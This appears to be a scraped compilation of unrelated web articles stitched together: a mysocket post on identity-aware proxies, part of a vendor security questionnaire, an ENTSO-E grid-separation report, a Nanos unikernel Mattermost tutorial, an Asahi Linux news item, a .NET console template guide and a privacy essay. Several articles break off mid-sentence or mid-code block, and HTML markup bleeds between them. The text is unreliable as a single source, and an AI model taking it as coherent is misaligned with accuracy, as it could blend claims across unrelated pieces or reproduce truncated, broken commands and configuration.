This implicit trust problem is something we typically see with, for example, corporate VPNs. With most corporate VPN’s once a user is authenticated, the user becomes part of the corporate network and, as a result, has access to many of the resources within the corporate infrastructure. In other words, once you’re on the VPN, you’re within the walls of the castle, you’re trusted, and you have lots of lateral access.</span></p><p id="viewer-btiap"><span>The world is changing, and the once traditional approach of trusting devices on your network are over. A few years ago, Google started the journey to their implementation of Zero trust called Beyond Corp. One of the core building blocks to get to a Zero Trust model is Identity aware application proxies. These proxies can provide strict access control on a per-application granularity, taking the users’ identity and contexts such as location and device status into account.</span></p><h2 id="viewer-3ila3"><span>Identity aware proxies</span></h2><p id="viewer-57q5s"><span>As of today, the Mysocket proxies have support for OpenID Connect, and with that, your sockets are identity-aware. This means that mysocket users can now enable authentication for their services and provide authorization rules.</span></p><pre id="viewer-5rebq"><span>mysocketctl connect \
   --port 3000 \
   --name "My Identity aware socket" \
   --cloudauth \
   --allowed_email_domains "mycorp.com" \
   --allowed_email_addresses "<a href="mailto:contractor1@gmail.com" target="_blank" rel="noopener">contractor1@gmail.com</a><a href="mailto:,john@doe.com" target="_blank" rel="noopener">,john@doe.com</a>"</span></pre><p id="viewer-d2hm3"><span>The example above shows how we can enable authentication by using the “<em>cloudauth</em>” CLI parameter. With <em>cloudauth</em> enabled, users will be asked to authenticate before access to your service is granted. Currently, we support authentication using Google, Facebook, Github, or locally created accounts. </span></p><p id="viewer-1dt8o"><span>The authentication flow uses OpenID connect to interact with the various Identity providers (IDP); thus, we can easily add more Identity providers in the future. We’re also looking at SAML as a second authentication flow. Please let us know if you have a need for more IDP’s or SAML, and we’ll work with you.</span></p><h2 id="viewer-4nklj"><span>Authorizations rules</span></h2><p id="viewer-8klui"><span>In addition to what the Identity Service Provider (IDP) provides, mysocket also provides two authorization rules. The <em>— allowed_email_domain </em>allows users to specify a comma-separated list of email domains. If your users are authenticating using their <em>mycorp.com</em> email address, then by adding this domain as an <em>allowed_email_domain</em>, will make sure only users with that domain have will be granted access.</span></p><p id="viewer-dv1a2"><span>Since multiple identities providers are supported, it’s easy to extend access to contractors or other 3rd party users. To provide access to external contractors that are not part of your mycorp.com domain, we can use the <em>allowed_email_addresses</em> parameter to add individual identities. This is great because now you can provide these contractors access without creating corporate accounts for them.</span></p><p id="viewer-50slu"><span>These are just two authorization rules; we’re planning to add more types of rules in the near future. Additional authorization rules that come to mind are, Geo-based rules (only allow access from certain countries or regions) or time of day type rules. If you require these types of rules or have suggestions for additional authorization rules, please let us know!</span></p><h2 id="viewer-6g4ct"><span>VPN replacement</span></h2><p id="viewer-ejnaq"><span>One of the unique features of mysocket is that the origin server initiates the connection to the Mysocket edge. This means that the origin servers can be on a highly secure network that only allows outbound connections. Meaning the origins can be hosted behind strict firewall rules or even behind NAT, like for example, a Private AWS VPC. With this, your origin server remains private and hidden.</span></p><p id="viewer-7eejt"><span>With the addition of authentication and authorization to Mysocket, we can now, on a very granular basis, provide access to your private services. Combining the secure outbound tunnel property and the identity-aware sockets, we can now look at this to provide an alternative to VPNs, while providing much more granular access to private or corporate resources.</span></p><div id="viewer-3l8b0"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.mysocket.io/post/introducing-identity-aware-sockets-enabling-zero-trust-access-for-your-private-services" data-pin-media="https://static.wixstatic.com/media/3b930f_0db243c8687b436985efba502bc9ed8a~mv2.png/v1/fit/w_1000%2Ch_700%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/3b930f_0db243c8687b436985efba502bc9ed8a~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><h2 id="viewer-adqh4"><span>Example use case</span></h2><p id="viewer-8d2kt"><span>Imagine a scenario where you work with a contractor that needs access to one specific private application, say an internal wiki, ticket system, or the git server in your corporate network. With the traditional VPN setup, this means we’d need to provide the contractor with a VPN account. Typically this means the contractor is now part of the corporate network, has a corporate user account, and now has access to much more than just the application needed.</span></p><blockquote id="viewer-53kp2"><span>Instead, what we really want is to <strong><em>only</em></strong> provide access to the one application and be very granular in who has access. With the addition of identity-aware sockets, this is now possible.</span></blockquote><h2 id="viewer-bo80k"><span>Demo time!</span></h2><p id="viewer-ep41j"><span>Alright, let’s give this a spin, demo time! In this demo, we’re making a Grafana instance that’s on a private network and behind two layers of NAT available to our employees as well as a contractor.</span></p><p id="viewer-3tb1b"><span>We’ll start by setting up the socket and tunnel using the “<em>mysocketctl connect</em>” command.</span></p><p id="viewer-d4s79"><span>This works great for demo’s; for more permanent setups, it’s recommended to use “<em>mysocketctl</em> <em>socket create</em>” and “<em>mysocketctl</em> <em>tunnel create</em>” so that you have a permanent DNS name for your service.</span></p><pre id="viewer-9m2bk"><span>mysocketctl connect \
   --port 3000 \
   --name "My Identity aware socket" \
   --cloudauth \
   --allowed_email_domains "mycorp.com" \

The same command also created the secure tunnel to the closest mysocket.io tunnel server, and we’re forwarding port 3000 on localhost to the newly created socket.</span></p><p id="viewer-kdc9"><span>Next, we launch a Grafana container. For fun, I’m passing in my AWS cloudwatch credentials, so I can create some dashboards for my AWS resources. I’ve configured grafana for proxy authentication. Meaning it will trust mysocket.io to do the authentication and authorization. Grafana will use the HTTP headers added by mysocket to determine the user information.</span></p><pre id="viewer-cdq3v"><span><span>[</span>auth<span>.</span>proxy<span>]</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Last year, one of our startups needed to buy a SaaS product (case management and workflow software). There were several promising vendors, all with products that looked impressive. Technically, all had the features and APIs we were looking for. However, we had security concerns. We planned on storing extremely sensitive data in this tool, and wanted to understand their security posture before we selected a vendor.</p><p>This a common problem; you’ve probably ran into it yourself. With SaaS software, how do you verify its security? As an industry, our answers are … poor. We have various certifications (PCI, HIPAA/HITECH, FedRAMP, etc), but all too often these are box-ticking exercises with no real security value – just ask <a href="https://www.schneier.com/blog/archives/2020/12/russias-solarwinds-attack.html">SolarWinds</a>.</p><p>So, security teams often end up sending potential vendors a bunch of questions – what Latacora calls a <a href="https://latacora.micro.blog/its-weird-to/">Dumb Security Questionnaire</a>. As the title implies, the practice … isn’t great. Most DSQs are full of questions with no security value (which explains why most security teams don’t actually read the responses!). But unfortunately, they’re also kinda the best we can do. Huge companies might be able to afford real human-powered security audits and convince vendors to allow them, but small startups like ours don’t have a better option than relying on DSQs.</p><p>As Latacora points out, it turns out there isn’t really a ton that you need to ask. As a startup, we’re not looking for our vendor to be Fort Knox; we just need to know that storing data with them is at least as safe as storing it internally. There are a limited number of likely ways that our vendor might get owned; we just need to ask about those few basic things. Latacora ends their post with this:</p><blockquote><p>Someone — and I am not volunteering — should write the DSQ that just nails these basic
things. 10 questions, no diagrams.</p></blockquote><p>Well, we tried; here it is.</p><h3 id="who-this-is-for">Who this is for</h3><p>This questionnaire is designed for smaller, probably early-stage companies who need to evaluate a vendor. It makes some assumptions:</p><ul><li>You have a security person (or team) who can evaluate the answers and is part of the decision-making process. If nobody’s going to read the answers, don’t waste your vendor’s time.</li><li><em>Your</em> answers to these questions are already pretty ok. If not, stop wasting time evaluating vendors. Just buy the thing and use the time you save to get your own house in order.</li><li>This is for some SaaS product that’ll have particularly high security impact - i.e. a breach of the vendor would be a major, potentially company-ending event. If you’re just trying to decide which ticket tracking system to use, again: just buy one and move on.</li><li>You have no particular compliance requirements – so you’re looking purely evaluate security posture, not compliance.</li></ul><h3 id="our-dumb-security-questionnaire">Our Dumb Security Questionnaire</h3><h4 id="1-please-answer-these-questions">(1) Please answer these questions:</h4><ol><li>If you use a cloud provider (GCP/AWS/Azure/etc):<ul><li>describe how credentials are provisioned, managed, and stored.</li><li>If an attacker gained access to an individual developer’s cloud

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>On 8 January 2021 at 14:05 CET the synchronous area of Continental Europe was separated into two separated areas due to outages of several transmission network elements in a very short time. The route where the two areas were separated is the following:</p><p><img src="https://d33wubrfki0l68.cloudfront.net/e57eb58e915151390602cbb873b8422e952e5837/26de1/assets/graphics/uploads/first-image-mod.jpg" alt="" title="Figure 1 - Map of Continental Europe showing the two separated areas during the system event on 8 January 2021"></p><p><em>Figure 1 - Map of Continental Europe showing the two separated areas during the system event on 8 January 2021</em></p><p>At approximately 14:05 CET, the frequency in the North-West Area of Continental Europe initially decreased to a value of 49.74 Hz within a period of around 15 seconds. Afterwards, the frequency reached a steady state value of approximately 49.84 Hz. At the same time, the frequency in the South-East Area initially increased to a value of up to 50.6 Hz before settling at a steady state frequency between 50.2 Hz and 50.3 Hz. This can also be seen from the graph below.</p><p><img src="https://d33wubrfki0l68.cloudfront.net/af53041f1f9915046a980de1662f685154376b5c/304f8/assets/graphics/uploads/second-image-mod.png" alt="" title="Figure 2 - Frequency in Continental Europe during the event on 8 January 2021"></p><p><em>Figure 2 - Frequency in Continental Europe during the event on 8 January 2021</em></p><p>Due to the underfrequency in the North-West Area, contracted interruptible services in France and Italy, in total around 1.7 GW, were disconnected in order to reduce the frequency deviation. These services are large customers who are contracted by the respective Transmission System Operators (TSOs) disconnected if frequency drops under a certain threshold. In addition, 420 MW and 60 MW of supportive power were automatically activated from the Nordic and Great Britain Synchronous areas respectively. These countermeasures ensured that already at 14:09 CET the frequency deviation was limited to a deviation of around 0.1 Hz in the North-West Area from the nominal frequency of 50 Hz (see Figure 2).</p><p>Due to the large overfrequency in the South-East Area, automatic and manual countermeasures were activated (i.e. the reduction of the feed-in of generation units) in order to stabilise the frequency. Thus, at 15.05 CET the frequency deviation in the South-East Area could be limited to +0.1 Hz from the nominal frequency of 50 Hz (see Figure 2).</p><p>The automatic response and the coordinated actions taken by the TSOs in Continental Europe ensured that the situation was quickly restored to normal operations. Actions were coordinated between the TSOs in order to reconnect the two areas as fast as possible again. Therefore, the contracted interruptible services in Italy could be reconnected at 14:47 CET and in France at 14:48 CET. At 15:08 CET, both areas were connected again to one synchronous area in Continental Europe.</p><p>ENTSO-E has kept the European Commission and the Electricity Coordination Group composed of representatives of Member States informed.</p><p>ENTSO-E is publishing today also questions and answers with regards to this event. All information published is subject to the results of a detailed investigation on the event which is ongoing. The investigation is following the legal framework under the Commission Regulation (EU) 2017/1485 of 2 August 2017 (System Operation Guideline) whereby National Regulatory Authorities and ACER are invited to join together with TSOs in the Investigation Panel.</p><p>In line with the provisions of the Commission Regulation (EU) 2017/1485 of 2 August 2017 (System Operation Guideline), ENTSO-E will present the results of the investigation to the Electricity Coordination Group and will subsequently publish them once the analysis is completed.</p><p><strong><em>Questions and answers</em></strong></p><p><strong>What is a system separation?</strong></p><p>The transmission grids of the countries of Continental Europe are electrically tied together to operate synchronously at the frequency of approximately 50 Hz. An event on 8 January 2021 caused the Continental Europe synchronous area to separate into two areas, with an area in the South-East of Europe being temporarily operating in separation from the rest of Continental Europe.</p><p><strong>Is this the first time such an event happens in Continental Europe?</strong></p><p>The Continental Europe synchronous area is one of the largest interconnected synchronous electricity systems in the world in terms of its size and number of supplied customers. Such a kind of event can happen in any electric power system. System resilience and preparedness of system operators in charge have a decisive impact on the consequences of such events. A separation of the synchronous area with a much larger disturbance and impacts on customers took place in Continental Europe on the 4 November 2006. This event was extensively analysed and led to a number of substantial developments, like the European Awareness System (EAS) which is a platform allowing TSOs to exchange operational information in real time, enabling them to react immediately in case of unusual system condition. The TSOs are therefore well prepared in order to coordinate and manage such events and limit the consequences. This preparedness and a permanent observation of the system frequency allowed to resynchronize the two separated areas in a very short period of time.</p><p><strong>How are countermeasures coordinated in Continental Europe in case of frequency deviations?</strong></p><p>In Continental Europe, procedures are in place to avoid system disturbances and especially large frequency deviations with the risk of uncoordinated disconnection of customers or generation. The TSOs Amprion (Germany) and Swissgrid (Switzerland) are responsible for these procedures in their role as synchronous area monitor (SAM) in Continental Europe. The SAM continuously monitors the system frequency. In case of large frequency deviations, they inform all TSOs via the European Awareness System (EAS) and launch an extraordinary procedure for frequency deviations to coordinate countermeasures in a fast and effective manner in order to stabilize the system. One step of this procedure is a telephone conference by Amprion, Swissgrid, RTE (France), Terna (Italy) and REE (Spain). This teleconference took place at 14:09 CET on 8 January 2021. In the telephone conference, the situation was evaluated, the TSOs informed about countermeasures which were already activated. The TSOs of the North-West and South-East area also coordinated the actions for reconnection in order to reach one synchronous area in Continental Europe again.</p><p><strong>Were end customers disconnected? Were there any other consequences?</strong></p><p>Customers in the order of 70 MW in the North-East Area and in the order of 163 MW in the South-East Area were disconnected. Due to the high resilience of the interconnected network and the rapid response of European TSOs, the security of operation and electricity supply was not endangered. An important contribution to stabilizing the system was delivered by the previously contracted interruptible services, which were activated in France and Italy. Such contracts which have been agreed with customers allow the TSO to temporarily and automatically reduce their electrical consumption depending on the situation with the electric power system in real-time.</p><p><strong>What caused the separation?</strong></p><p>In line with the provisions of the System Operation Guideline, a detailed investigation is ongoing on the event. This includes a comprehensive analysis of large numbers of real-time recordings from protection devices and other electric power system elements. ENTSO-E will publish the results of this investigation as soon as the analysis is finalised.</p><p><strong>Press Contact:</strong> Claire Camus &nbsp;+32 476 975093 claire.camus@entsoe.eu</p></div></div></div></div>]]>

                <p>Mattermost is an open source, private cloud slack
alternative written in Go and React. It has many integrations and can
can connect to mysql or postgres for persistence. While there are many
"hello world" tutorials out there for running the Nanos unikernel we
thought this would be a nice little example to showcase two things:</p>

<p>1) How to run a multi-node setup. Most web applications are more than
just one actual application - the canonical example would be a webapp
server and its corresponding database.</p>
<p>2) How to interact with taps and bridges for a faster networking
experience or if you wanted to build your own private cloud. (Creating taps,
today, will only work on Linux as the tuntaposx package does not work
anymore but we're looking at alternatives.)</p>

<p>Ready? Let's get started.</p>

                <h3>Running mysql as a Nanos unikernel</h3>

                <p>We start by running the mysql server as a unikernel.
We've created a convenient package to use and the only thing you need to
do is set your base volume size. You could create an external volume but
we'll leave that to a different article.</p>

<pre><code>{
  "BaseVolumeSz": "400m"
}
</code></pre>

<p>Now let's run mysql by creating a tap device and assigning it a
static ip:</p>

                <pre><code>➜  mysql ops load mysql_5.7.29 -c config.json -p 3306 -b -t tap0 --ip-address 192.168.42.19

                <h3>Running MatterMost as a Unikernel</h3>

be confused with the config.json we use for ops). Create a 'config'
directory to store it in. Copy the config.json in. If you want, you can
untar the tarball found in ~/.ops/packages/mattermost_5.12.0.tar.gz and grab a
copy there. Then you'll want to edit the mysql "DataSource" line in
config.json to modify the ip address and l/p:</p>

<pre><code>"DataSource": "root:root@tcp(192.168.42.19:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
</code></pre>

<p>Obviously this is just for demo purposes but as a side note - if you
do accidently deploy this to a public ip with default credentials the
bots that scour the internet looking for these things will be able to
connect and write all the SQL their little bot hearts desire, but their
db encryption operations fail, the cryptojacking
fails, and all the C&amp;C stuff fails. It just shows you how interesting
this style of architecture truly is.</p>

<p>Now let's load up mattermost and give it it's own tap and assign it a static ip address:</p>

                <pre><code>➜ ops load mattermost_5.12.0 -c config.json -p 8065 -b -t tap1 --ip-address 192.168.42.20

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Two weeks ago, security researcher and developer Hector Martin (@marcan42 on Twitter), <a href="https://the8-bit.com/asahi-is-a-novel-project-with-the-goal-of-porting-linux-to-m1-macs/">kicked off an ambitious project</a> with the goal of natively bringing Linux to <a href="https://the8-bit.com/which-m1-apple-silicon-macbook-you-should-buy/">Apple Silicon Macs</a>. The operating system-to-be is called Asahi Linux and apparently today, the project experienced its first breakthrough.</p>
<p>Apple released the second beta of macOS Big Sur 11.2 yesterday. It’s an incremental upgrade that does not necessarily bring grandiose novelty to the table. Instead, as it goes, beta versions often do introduce a lot of under-the-hood features. And one of those features was custom kernel support, as noted by Hector himself.</p>
<p>A kernel is one of the most important aspects of an operating system that has absolute control over everything happening inside a computer. It is a cog that is responsible for interactions between hardware and software components.</p>
<p>That said, support for custom kernels might not excite you, per se. But if you’re dedicated to reverse-engineer Apple’s software for Macs, it’s a pretty big deal. Custom kernels are essentially modified stock kernels. You can add your own features to the modified kernel that the manufacturer does not ship in its own, which means you can make a computer do things it wasn’t originally intended to do.</p>
<p>According to Hector, thanks to kernel support in the latest macOS beta, “the OS now finally includes the firmware and bootloaders and tools necessary to replace Big Sur with not-Big-Sur. That was previously not possible.” He also shared a clip of his MacBook Air displaying the Asahi Linux bootloader:</p>
<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>It's happening.</p><p>macOS Big Sur 11.2 beta 2 is out with full custom kernel support.</p><p>Expect a fun early bring-up stream tomorrow. Time to get a few hours of sleep. <a href="https://t.co/Ujq159DqWQ" target="_blank">pic.twitter.com/Ujq159DqWQ</a></p></div>— Hector Martin (@marcan42) <a href="https://twitter.com/marcan42/status/1349478954982232064?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">January 13, 2021</a></blockquote>
</div></figure>
<p>A bootloader, for instance, is an integral part of powering up your machine. It handles the boot order of operating systems on a machine. Each machine has a bootloader that’s specific to it and gaining control over it is an important step towards installing an entirely different operating system.</p>
<p>Despite the new improvements, it might take some time for a native Linux installation on an M1 Mac to realize and be ready for public distribution. Aside from the custom kernel support, the developers on the Asahi Linux project still need to work on developing drivers for the operating system.</p><div><p>See also</p><div id="block-wrap-95278" data-id="95278" data-base="0"><div><div><div><article><div><p><a href="https://the8-bit.com/apple-store-goes-down-ahead-of-todays-mac-event/" title="Apple Store Down"><img width="100" height="100" src="https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-100x100.jpg" alt="Apple Store Down" srcset="https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-100x100.jpg 100w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-293x293.jpg 293w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-432x432.jpg 432w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-529x529.jpg 529w, https://the8-bit.com/wp-content/uploads/2020/11/Apple-Store-Down-724x724.jpg 724w" sizes="(max-width: 100px) 100vw, 100px"></a></p></div></article></div></div></div></div></div>
<p>Back in November 2020, Apple’s VP of Software Engineering Craig Federighi said <a aria-label="in an interview with Ars Technica (opens in a new tab)" href="https://arstechnica.com/gadgets/2020/11/we-are-giddy-interviewing-apple-about-its-mac-silicon-revolution/" target="_blank" rel="noreferrer noopener">in an interview with Ars Technica</a> that when it comes to Windows running natively on an M1 Mac, “that’s really up to Microsoft. We have the core technologies for them to do that, to run their ARM version of Windows, which in turn of course supports x86 user-mode applications. But that’s a decision Microsoft has to make, to bring to license that technology for users to run on these Macs. But the Macs are certainly very capable of it.”</p>
<p>The newly added support for custom kernels on Big Sur’s 11.2 Beta 2 may also set a precedent for Microsoft to make the ARM version of Windows available to M1 Mac users as an alternate operating system.</p>
<p>As we’ve noted before, Asahi Linux is an independent project that relies on people’s contributions to continue. You can either offer to volunteer your expertise to the project or contribute an amount to the <a aria-label="project's Patreon (opens in a new tab)" href="https://asahilinux.org/support/" target="_blank" rel="noreferrer noopener">project’s Patreon</a> to expedite the development.</p>

<div id="content">
<p>There's type of application that has followed me since I learned to code in the mid-'80s, and that's the console application. For years they looked the same a <code>Main(string[] args)</code> and some naive inconsistent command line parser. That gradually improved with the adoption of various OSS helper libraries. In this post, I'll walk through what today is my alternative starting point to <code>dotnet new console</code>, a way that greatly reduces the boilerplate code needed for logging, parsing, and validation of arguments, letting me focus on the problem to solve and not the plumbing.</p>
<h2 id="templates">Templates</h2>
<p>A convenient way to scaffold a new project is using the template function of .NET SDK CLI, it comes preloaded with several templates like <code>console</code>, <code>classlib</code>, etc., but beyond that, it's possible to create your own templates, which I've for my and your convenience created, so given <a href="https://dotnet.microsoft.com/download/dotnet/5.0">.NET 5 SDK</a> installed, easily yourself can try and take a look at everything discussed in this post.</p>
<h2 id="devlead-console-template">Devlead Console Template</h2>
<p>So let's get started with creating a new console application according to my opinionated recipe, .NET SDK Templates are distributed as NuGet packages and the canonical source for NuGet packages is <a href="https://www.nuget.org/">NuGet.org</a>, where I've published my template as <a href="https://www.nuget.org/packages/Devlead.Console.Template/">Devlead.Console.Template</a>. Templates are installed using the <code>dotnet new</code> command with <code>--install packageId</code> parameter, in this case:</p>
<pre><code>dotnet new --install Devlead.Console.Template
</code></pre>
<h2 id="dotnet-new-devleadconsole">dotnet new devleadconsole</h2>
<p>With the template installed locally, we now have a new <code>devleadconsole</code> template at our disposal, to create our new console applications with according to me, essential dependencies and boilerplate code:</p>
<pre><code>dotnet new devleadconsole -n MyConsoleApp
</code></pre>
<p>The above command will in the current directory result in the below folder structure</p>
<pre><code>MyConsoleApp
    │   MyConsoleApp.csproj
    │   Program.cs
    │
    └───Commands
        │   ConsoleCommand.cs
        │
        ├───Settings
        │       ConsoleSettings.cs
        │
        └───Validation
                ValidateStringAttribute.cs
</code></pre>
<h2 id="myconsoleapp.csproj">MyConsoleApp.csproj</h2>
<p>The created project file will look something like below</p>
<pre><code>&lt;Project Sdk="Microsoft.NET.Sdk"&gt;
  &lt;PropertyGroup&gt;
    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
    &lt;TargetFramework&gt;net5.0&lt;/TargetFramework&gt;
    &lt;Nullable&gt;enable&lt;/Nullable&gt;
    &lt;TreatWarningsAsErrors&gt;true&lt;/TreatWarningsAsErrors&gt;
  &lt;/PropertyGroup&gt;
  &lt;ItemGroup&gt;
    &lt;PackageReference Include="Spectre.Console" Version="0.37.0" /&gt;
    &lt;PackageReference Include="Spectre.Cli.Extensions.DependencyInjection" Version="0.3.0" /&gt;
    &lt;PackageReference Include="Microsoft.Extensions.Logging" Version="5.0.0" /&gt;
    &lt;PackageReference Include="Microsoft.Extensions.Logging.Console" Version="5.0.0" /&gt;
    &lt;PackageReference Include="Microsoft.SourceLink.GitHub" Version="1.0.0" PrivateAssets="All"/&gt;
  &lt;/ItemGroup&gt;
&lt;/Project&gt;
</code></pre>
<p>let's step for step break it down</p>
<h3 id="outputtype">OutputType</h3>
<p><code>OutputType</code> with the value <code>exe</code>, indicates that this will be an executable.</p>
<h3 id="targetframework">TargetFramework</h3>
<p><code>TargetFramework</code> with the value <code>net5.0</code>, means that this will be compiled for/targeting .NET 5.</p>
<h3 id="nullable">Nullable</h3>
<p><code>Nullable</code> with the value <code>enable</code>, enables the <a href="https://docs.microsoft.com/en-us/dotnet/csharp/nullable-references">nullable reference types</a> feature that was introduced with C# 8, making reference types non-nullable by default, basically moving many errors from being caught late at runtime, to be caught early at compile time.</p>
<h3 id="treatwarningsaserrors">TreatWarningsAsErrors</h3>
<p><code>TreatWarningsAsErrors</code> with the value <code>true</code> makes the compiler grumpier, it won't just break the build for compiler errors, but also for compiler warnings, combined with <code>Nullable</code> I personally believe code quality gets better from the start.</p>
<h3 id="packagereferences">PackageReference(s)</h3>
<ul>
<li><strong><a href="https://www.nuget.org/packages/Spectre.Console">Spectre.Console</a></strong> is a lot of things, a true swiss army for anyone doing console applications, but in this template, it's foremost an extremely opinionated command-line parser.</li>
<li><strong><a href="https://www.nuget.org/packages/Spectre.Cli.Extensions.DependencyInjection">Spectre.Cli.Extensions.DependencyInjection</a></strong> makes it easy for <a href="https://www.nuget.org/packages/Spectre.Console">Spectre.Console</a> to interop with standard <strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.DependencyInjection/">Microsoft DependencyInjection</a></strong>, same as used by default for dependency injection with i.e. ASP .NET and Azure Functions.</li>
<li><strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.Logging">Microsoft.Extensions.Logging</a></strong> simplified provides standard logging abstractions and <strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.Logging.Console">Microsoft.Extensions.Logging.Console</a></strong> provides an implementation for logging to the console.</li>
<li><strong><a href="https://www.nuget.org/packages/Microsoft.SourceLink.GitHub">Microsoft.SourceLink.GitHub</a></strong> enables automatic tracking between artifact and source control, providing a better debugging and traceability experience.</li>
</ul>
<h2 id="program.cs">Program.cs</h2>
<p>The generated <code>Program.cs</code> uses the new C#9 <a href="https://docs.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-9#top-level-statements">Top-level statement</a> pattern removing unnecessary ceremony code from the application, but what it does contain:</p>
<ol>
<li>using statements</li>
<li>Creating dependency injection container</li>
<li>Console logger registration</li>
<li>Hooking up dependency injection container with Spectre.Console</li>
<li>Spectre.Console command declaration</li>
<li>Execute the application</li>
</ol>
<blockquote>
<p>Note: <a href="https://docs.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-9#top-level-statements">Top-level statement</a> means as <code>RunAsync</code> returns a <code>Task&lt;int&gt;</code>, .NET 5 will automatically generate "<code>Program</code>" class and <code>async Task&lt;int&gt; Main(string args)</code> for you, removing the need to write a lot of boilerplate code.</p>

<h2 id="conclusion">Conclusion</h2>
<p>This is my opinionated happy path for doing .NET Console applications, feel free to let me know if you've got your own recipe for success, but must say I'm really happy how this combination lets me write console applications in the same way as I do my .NET workers, Azure Functions, ASP .NET Core, etc. ensuring consistency, less duplication and good reuse of both patterns and code. There's a LOT more to <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> than command-line parsing, to I hight …</p></div></div></div></div>

    </span></p><p><em>This is a thought exercise to help explore what is okay (and what isn't) when it comes to the exchange between personal information and the provision of a personalised service.</em></p><p>Imagine you've moved to a new city and you're in need of a hairdresser to do your hair every other week. Perhaps you try out one or two different ones first, or perhaps you go with a friend's recommendation. Either way, after a short while you've settled on a hair dresser you're happy with. They're professional, they treat you well, they remember your name and you build up a relationship with them over time.</p><p>As you visit this hairdresser more often, they gain more experience with your specific hair type, your preferred hair style and your preferred hair products. Perhaps the hairdresser, knowing that you have particularly thick hair, and remembering that you dislike the way it curls around your ears when it gets too long, ensures a shorter cut in those areas by default. Or, perhaps remembering that you’re most happy when your hair has a bouncy look to it, they introduce you to a specific type of wax that helps you achieve that type of effect.</p><p>There's a direct relationship here between (1) how much the hairdresser knows about you, and remembers about you, and (2) the quality of the service you receive. The more the hairdresser knows about you, the better the service they can provide. It's convenient to you when you don't have to explain what you want every time you visit. It's valuable to you when your hairdresser knows so much about your hair and your preferences that they're able to suggest things to you you didn't even know you wanted. It can also be nice if they remember the names of your children, or if they ask about that issue you were grappling with at work the last time you stopped by.</p><p>Now imagine it’s time for your regular haircut, so you visit your trusted hairdresser. You sit down in the salon chair, as you've been doing every other week and they tell you they'll be "right with you." As you look into the mirror in front of you, you see them in the reflection walking up to the coat hanger where you've hung up your coat. Having arrived at your coat they start to insert their hand into your coat's pockets one by one. For each pocket they extract its contents (your wallet, your mobile phone, your keys <sup id="fnref-1"><a href="#fn-1">1</a></sup>) and examine each carefully, before placing them back. After having made their way through your entire coat, they return to your chair to finally tend to your needs: "So, what will it be today? The usual?"</p><p>In this real-life scenario most people would, at the very least, be astonished but hopefully also a bit angry. You might want to say: "Hey! What are you doing in my coat?" Now imagine their response being "Oh, that's just a new policy we've introduced which helps us improve our service to you. You see," they continue, "as I was examining the items in your coat, I noticed a car key with an Audi logo. One of my friends happens to be an Audi mechanic. I can put you in touch with him, if you're interested, and they can help you if your car ever breaks down. I also made note of the contacts in your phone, and if one of them ever comes in for a haircut, and I'll be sure to give them a special treatment, on the house." <sup id="fnref-2"><a href="#fn-2">2</a></sup></p><p>Would this explanation suffice for you? Would it be sufficient justification for rummaging <sup id="fnref-3"><a href="#fn-3">3</a></sup> through your coat? Would it quench the anger you felt above?</p><p>I would hope that to most people this justification sounds silly, perhaps even patronizing and certainly not an adequate justification for rummaging through your belongings. Whether or not the hairdresser's rummaging improves his service to you doesn't matter.</p><p>The only thing that matters here is that your hairdresser has no business rummaging through your fucking coat <sup id="fnref-4"><a href="#fn-4">4</a></sup>.</p><p>Please remember how this makes you feel. We're going to change some variables in the story and see what happens.</p><p>Let's go back to our imagined scenario. You feel offended that your hairdresser went through your coat and you say: "Hey man, I didn't agree to that!"</p><p>"Oh, I'm sorry" he replies "I didn't mean to offend you. But actually, you did consent to this new policy. You see, there's a sign at the door which says:</p><p><em>‘Anybody that walks through this door consents to their coat being rummaged through for purposes of improving our service to you.'</em></p><p>So by walking through the door, you've actually given your consent." <sup id="fnref-5"><a href="#fn-5">5</a></sup>.</p><p>Let’s ignore, for the sake of brevity, the issue of whether walking through a door could reasonably constitute giving consent. Imagine instead that you don't catch the hairdresser rummaging through your coat, but instead they tell you their assistant will examine all your belongings while you lie back, close your eyes and have your hair washed by them with lavender shampoo.</p><p>Try to notice within yourself: Do you feel less outrage if you're not witnessing the act of someone rummaging through your coat, but you know it's happening? For me it makes it slightly more difficult to "find" the outrage inside of myself. Since I’m not witnessing the act with my own eyes, I need to first imagine it happening before I'm able to perceive any level of outrage. The outrage is still there, but it's become a bit harder to access. It's become a bit more distant if you will.</p><p>Let's continue to change variables. Let's imagine there's no assistant but the hairdresser has installed a high tech camera in the room which, without touching your coat and within a microsecond, is able to scan your coat and analyze all its contents. In doing so, it is able to extract the same information the hairdresser and their assistant were able to do when they were doing it themselves. Imagine this takes place in a split second and it happened as you sat down.</p><p>Do you feel angry about what just happened? Do you feel less outrage than before now that the violation is invisible to you, instantaneous and done through an inanimate object?</p><p>For me, I feel outrage, but it's become less visceral and more intellectual. It's as if I only feel outrage because I’m able to follow a sequence of logical steps to arrive at the conclusion that the outcomes of the camera scan and the physical rummaging are one and the same. That said, without the image of a person with their hands in my coat (imagined or not), it’s more difficult to feel outraged. It’s also harder to feel outraged when the violation is committed by an inanimate object. For one, I'm not sure who to get angry at, and I somehow feel less violated when it's a machine or an algorithm committing the act.</p><p>Now go one step further and imagine it's not even a high-tech camera doing the scanning, but some unknown technology which you cannot see and do not understand. It’s not located anywhere you can point at, it’s just “there” somewhere in the hairdresser’s salon with you as it scans the contents of your jacket.</p><p>Are you able to find any outrage at all this time? </p><p>I 